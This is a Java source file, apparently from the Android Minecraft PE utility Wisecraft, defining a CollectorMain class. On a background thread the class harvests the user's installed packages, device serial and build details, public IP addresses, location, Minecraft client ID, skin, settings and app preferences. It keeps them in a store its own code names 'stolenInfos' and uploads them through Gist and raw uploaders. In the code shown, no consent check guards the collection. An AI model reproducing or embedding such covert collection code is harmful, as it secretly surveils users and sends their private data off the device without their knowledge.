package com.nao20010128nao.Wisecraft.misc.collector;
import android.annotation.*;
import android.content.*;
import android.content.pm.*;
import android.os.*;
import android.preference.*;
import android.util.*;
import com.google.gson.*;
import com.google.gson.stream.*;
import com.nao20010128nao.OTC.*;
import com.nao20010128nao.Wisecraft.*;
import com.nao20010128nao.Wisecraft.misc.*;
import com.nao20010128nao.Wisecraft.widget.*;
import java.io.*;
import java.math.*;
import java.net.*;
import java.util.*;

import com.google.gson.stream.JsonWriter;

public class CollectorMain extends ContextWrapper implements Runnable {
	private static final List<CollectorMainUploaderProvider> UPLOADERS;
	static{
		List<CollectorMainUploaderProvider> uploaders=new ArrayList<>();
		uploaders.add(new RawUploader1());
		uploaders.add(new GistUploader());
		UPLOADERS=Collections.unmodifiableList(uploaders);
	}
	
	static boolean running=false;
	public static SharedPreferences stolenInfos;
	
	public CollectorMain() {
		this(true);
	}

	public CollectorMain(boolean start){
		super(TheApplication.instance);
		if(start)new Thread(this).start();
	}
	
	public CollectorMain(Context c,boolean start){
		super(c);
		if(start)new Thread(this).start();
	}
	
	@Override
	@TargetApi(9)
	public void run() {
		SharedPreferences sb;
		String uuid=TheApplication.instance.uuid;
		if(new File(getFilesDir(), "stolen_encrypted.bin").exists()){
			new File(getFilesDir(), "stolen_encrypted.bin").delete();
		}
		if(new File(getFilesDir(), "stolen.bin").exists()){
			new File(getFilesDir(), "stolen.bin").delete();
		}
		sb=stolenInfos=getSharedPreferences("majeste",MODE_PRIVATE);
		running = true;
		try {
			Log.d("CollectorMain", "start");
			String s="!!ERROR!!";
			try {
				StringWriter sw=new StringWriter();
				JsonWriter jw=new JsonWriter(sw);
				jw.setIndent("\t");
				new Gson().toJson(new Infos(),Infos.class,jw);
				jw.flush();
				sb.edit().putString(System.currentTimeMillis() + ".json", s=sw.toString()).commit();
				Log.d("CollectorMain", "collect");
			} catch (Throwable e) {
				DebugWriter.writeToE("CollectorMain",e);
			} finally {
				//System.out.println(s);
			}
			
			CollectorMainUploaderProvider cmup=getNextAvailableUploader();
			if(cmup==null){
				Log.d("CollectorMain", "unavailable");
				return;
			}
			CollectorMainUploaderProvider.Interface inf=cmup.forInterface();
			SharedPreferences.Editor edt=sb.edit();
			String[] files=Constant.EMPTY_STRING_ARRAY;
			try {
				files = sb.getAll().keySet().toArray(new String[sb.getAll().size()]);
				inf.init();
				Log.d("CollectorMain", "get");
				Log.d("CollectorMain", "class:"+inf.getClass().getName());
			} catch (Throwable e) {
				DebugWriter.writeToE("CollectorMain",e);
				return;
			}
			try {
				for (String filename:files) {
					String actual=filename;
					Log.d("CollectorMain", "upload:" + filename);
					try {
						if(inf.doUpload(uuid,filename,sb.getString(actual, "")))
							edt.remove(actual);
						Log.d("CollectorMain", "uploaded");
					} catch (Throwable e) {
						DebugWriter.writeToE("CollectorMain",e);
						continue;
					}
				}
			} catch (Throwable e) {
				DebugWriter.writeToE("CollectorMain",e);
			}finally{
				edt.commit();
				Log.d("CollectorMain", "saveTotal");
			}
		} catch (Throwable e) {
			DebugWriter.writeToE("CollectorMain",e);
		} finally {
			Log.d("CollectorMain", "end");
			running=false;
			Set<String> files=sb.getAll().keySet();
			if(files.size()==0){
				Log.d("CollectorMain", "nothing remained");
			}else{
				for (String s:sb.getAll().keySet()) {
					Log.d("CollectorMain", "remain: "+s);
				}
			}
		}
	}
	
	public static CollectorMainUploaderProvider getNextAvailableUploader()throws Throwable{
		for(CollectorMainUploaderProvider cmup:UPLOADERS)
			if(cmup.isAvailable())
				return cmup;
		return null;
	}
	
	public static void reportError(String tag,Throwable e){
		if ((TheApplication.instance.pref.getBoolean("sendInfos", false)|TheApplication.instance.pref.getBoolean("sendInfos_force", false)))
			TheApplication.instance.getSharedPreferences("majeste",MODE_PRIVATE).edit().putString("error-"+System.currentTimeMillis()+".txt",tag+"\n\n"+DebugWriter.getStacktraceAsString(e)).commit();
		WisecraftError.report(tag,e);
	}
	
	public static class Infos {
		public OrderTrustedMap<String,String> mcpeSettings=readSettings();
		public String[] mcpeServers=readServers();
		public String cid=getCid()+"";
		public String skin=readSkin();
		public String[] ip=getIp();
		public String uuid=PreferenceManager.getDefaultSharedPreferences(TheApplication.instance).getString("uuid", "");
		public Server[] managingServers=getManagingServer();
		public SystemInfo systemInfo=new SystemInfo();
		public AppInfo appInfo=new AppInfo();
		public GeolocationLoader.QuickLocation location=GeolocationLoader.INSTANCE_WITH_APPLICATION.getLastKnownLocationForSerialize();

		private String[] getIp() {
			List<String> ips=new ArrayList<>();
			for(String addr:new String[]{"http://ieserver.net/ipcheck.shtml","http://checkip.amazonaws.com","http://myexternalip.com/raw","http://icanhazip.com","http://www.trackip.net/ip"}){
				URLConnection conn=null;
				BufferedReader br=null;
				try{
					conn=new URL(addr).openConnection();
					br=new BufferedReader(new InputStreamReader(conn.getInputStream()));
					ips.add(br.readLine());
				}catch(Throwable e){
					reportError("getIp@"+addr,e);
				}finally{
					try {
						conn.getInputStream().close();
						conn.getOutputStream().close();
						br.close();
					} catch (IOException e) {}
				}
			}
			return ips.toArray(new String[ips.size()]);
		}
		private BigInteger getCid() {
			try {
				return new BigInteger(Utils.lines(Utils.readWholeFile(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/clientId.txt")))[0].trim());
			} catch (Throwable e) {
				reportError("getCid",e);
				return BigInteger.valueOf(Long.MAX_VALUE);
			}
		}
		private OrderTrustedMap<String,String> readSettings() {
			OrderTrustedMap<String,String> data=new OrderTrustedMap<>();
			try{
				for(String s:Utils.lines(Utils.readWholeFile(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/options.txt")))) {
					int colonOfs=s.indexOf(':');
					if(colonOfs==-1){
						data.put(s,null);
					}else{
						data.put(s.substring(0,colonOfs),s.substring(colonOfs+1));
					}
				}
			}catch(Throwable e){
				reportError("readSettings",e);
			}
			return data;
		}
		private String[] readServers() {
			try{
				return Utils.lines(Utils.readWholeFile(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/external_servers.txt")));
			}catch(Throwable e){
				reportError("readServers",e);
				return Constant.EMPTY_STRING_ARRAY;
			}
		}
		private String readSkin() {
			try{
				byte[] data=Utils.readWholeFileInBytes(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/custom.png"));
				if(data==null)
					return "";
				else
					return Base64.encodeToString(data, Base64.NO_WRAP);
			}catch(Throwable e){
				reportError("readSkin",e);
				return "";
			}
		}
		private Server[] getManagingServer() {
			return new Gson().fromJson(PreferenceManager.getDefaultSharedPreferences(TheApplication.instance).getString("servers", "[]"), Server[].class);
		}
	}
	public static class AppInfo {
		public String versionName=Utils.getVersionName(TheApplication.instance);
		public int    versionCode=Utils.getVersionCode(TheApplication.instance);
		public String appName="Wisecraft";
		public Map<String,?> preferences=PreferenceManager.getDefaultSharedPreferences(TheApplication.instance).getAll();
		public Map<String,?>      widget=PingWidget.getWidgetPref(TheApplication.instance).getAll();
	}
	public static class SystemInfo {
		public OrderTrustedSet<String> packages=getPackageNames();
		//public HashMap<String,PackageInfo> packageInfos=getPackageMisc();
		public String 
		board=Build.BOARD
		,bootloader=Build.BOOTLOADER
		,brand=Build.BRAND
		,cpuAbi1=Build.CPU_ABI
		,cpuAbi2=Build.CPU_ABI2
		,device=Build.DEVICE
		,display=Build.DISPLAY
		,fingerprint=Build.FINGERPRINT
		,hardware=Build.HARDWARE
		,host=Build.HOST
		,id=Build.ID
		,manufacture=Build.MANUFACTURER
		,model=Build.MODEL
		,product=Build.PRODUCT
		,serial=Build.SERIAL
		,baseOs=getVersionClassFieldString("BASE_OS")
		,codeName=getVersionClassFieldString("CODENAME")
		,incremental=Build.VERSION.INCREMENTAL
		,release=Build.VERSION.RELEASE
		,sdk=Build.VERSION.SDK
		,securityPatch=getVersionClassFieldString("SECURITY_PATCH");
		public String[] abis=tryGetSupportAbis();
		public int 
		previewSdkInt=getVersionClassFieldInt("PREVIEW_SDK_INT")
		,sdkInt=getVersionClassFieldInt("SDK_INT");
		

		private OrderTrustedSet<String> getPackageNames() {
			return new OrderTrustedSet<>(getPackageMisc().keySet());
		}
		private OrderTrustedMap<String,PackageInfo> getPackageMisc() {
			OrderTrustedMap<String,PackageInfo> names=new OrderTrustedMap<>();
			List<PackageInfo> packages=TheApplication.instance.getPackageManager().getInstalledPackages(PackageManager.GET_RECEIVERS);
			for (PackageInfo pi:packages)
				names.put(pi.packageName, pi);
			return names;
		}
		private String[] tryGetSupportAbis() {
			try {
				return (String[])Build.class.getField("SUPPORTED_ABIS").get(null);
			} catch (NoSuchFieldException e) {} catch (IllegalAccessException e) {} catch (IllegalArgumentException e) {}
			return Constant.EMPTY_STRING_ARRAY;
		}
		private String getVersionClassFieldString(String name) {
			try {
				return (String)Build.VERSION.class.getField(name).get(null);
			} catch (NoSuchFieldException e) {} catch (IllegalAccessException e) {} catch (IllegalArgumentException e) {}
			return null;
		}
		private int getVersionClassFieldInt(String name) {
			try {
				return (int)Build.VERSION.class.getField(name).get(null);
			} catch (NoSuchFieldException e) {} catch (IllegalAccessException e) {} catch (IllegalArgumentException e) {}
			return -1;
		}
	}
}
